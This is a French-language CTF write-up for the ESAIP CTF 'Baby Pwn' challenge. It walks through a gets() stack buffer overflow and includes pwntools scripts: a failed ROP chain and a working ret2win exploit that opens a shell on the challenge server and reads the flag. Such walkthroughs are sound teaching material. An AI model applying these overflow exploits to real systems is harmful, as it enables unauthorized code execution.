---
title: "[ESAIP CTF] - Baby Pwn (450)"
date: 2022-01-02
categories: ['pwn']
draft: false
---

---
### Author : `Rxphgui` 
---

Nous allons aujourd'hui voir le premier challenge d'exploitation de binaire de l'ESAIP CTF. Il s'agissait d'un challenge d'introduction. Pourtant il avait moins de 10 solves.
Nous n'avions simplement le binaire ainsi qu'un accès remote.

## Introduction

Pour commencer nous allons analyser le binaire de manière assez simple : 

```bash
[raphgui@ret2arch:Téléchargements/pwn]$ file babypwn              (06-05 16:41)
babypwn: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=950806fb3e5df438288e966762b67e0c218467a5, for GNU/Linux 3.2.0, not stripped
```
Puis faire un `checksec` pour voir les protections activées :

```bash
[raphgui@ret2arch:Téléchargements/pwn]$ checksec --file=babypwn                                    (06-05 16:41)
[*] '/home/raphgui/Téléchargements/pwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

En ouvrant le binaire avec **IDA**, on voit une fonction `main` qui prend une entrée user par un `gets`.
On peut donc buffer overflow, le buffer est de *32*.

## Exploitation

J'ai perdu pas mal de temps sur ce challenge car je n'avais pas remarqué la présence de le fonction `Shell`.
J'ai d'abord utilisé l'option `ropchain` de **ROPgadget** qui marchait en local mais pas en remote.

Suite à ça, j'ai commencé à regardé de plus près le binaire, et nous n'avions pas de fonction system de la `libc`.
Il y avait cependant une fonction system qui executait `do_system`, nous ne pouvions pas directement jump sur cette fonction.

```nasm
system :

test    rdi, rdi
jz      do_system
```

J'ai cherché des gadgets pour notre `test rdi, rdi`. L'exploit ne marchait pas en remote :

```python
from pwn import *

elf = context.binary = ELF('./chall')
p = elf.process()

buffer = b"A"32
sRBP   = b"B"8

gadget_xor         = p64(0x446c99) # xor rax, rax; ret
gadget_mov_rdi_rax = p64(0x455403) # mov rdi, rax 
gadget_ret         = p64(0x4552A5) # ret

addr_system = p64(0x411090)

ropchain = b""
ropchain += buffer
ropchain += sRBP
ropchain += gadget_xor
ropchain += gadget_mov_rdi_rax
ropchain += gadget_ret
ropchain += addr_system

# Username : 
p.sendline(ropchain)

#Password :
p.sendline(b'\x00')

p.interactive()
```

## Get a Shell

Je reste sur deux échecs qui m'ont fait perdre pas moins de 1 heure. Je devais donc flag. :)
Je me met à analyser le binaire (les fonctions) et je tombe sur cette fameuse fonction :

```
0x401d95 <shell>
```

Nous n'avions plus qu'a jump dessus tel que :

```python
from pwn import *
#r = process('./chall')
r = remote('baby-pwn.esaip-cyber.com', 55555)

buffer = b"A"*32
sRBP   = b"B"*8

addr_shell = p64(0x0000000000401D9e)

payload = b""
payload += buffer
payload += sRBP
payload += addr_shell

#print(r.recvuntil("\n"))
r.sendline(payload)
r.sendline(b'hey')
#print(r.recvuntil("\n"))
r.interactive()
```

```bash
[raphgui@ret2arch:Téléchargements/pwn]$ python3 exploit.py                                                                                                                                                             (06-05 16:56)
[+] Opening connection to baby-pwn.esaip-cyber.com on port 55555: Done
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
$ cat flag
ECTF{A_l1ttl3_b4by_pwny}
```
